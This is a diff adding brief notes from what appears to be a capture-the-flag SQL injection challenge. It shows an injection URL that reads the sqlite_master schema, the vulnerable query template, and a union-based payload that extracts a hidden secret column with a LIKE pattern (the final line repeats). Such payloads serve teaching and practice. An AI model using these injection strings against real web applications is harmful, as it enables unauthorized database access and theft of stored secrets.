@@ -1,0 +1,7 @@
+https://bamboofox.cs.nctu.edu.tw:13302/?id='union SELECT sql FROM sqlite_master where sql like 'C%'
+
+SELECT name FROM users WHERE id = '$id'
+
+SELECT name FROM users WHERE id = ''union SELECT secretco1umn FROM secret7able where secretco1umn like 'C%' escape "\\";--'
+
+SELECT name FROM users WHERE id = ''union SELECT secretco1umn FROM secret7able where secretco1umn like 'C%' escape "\\";--'
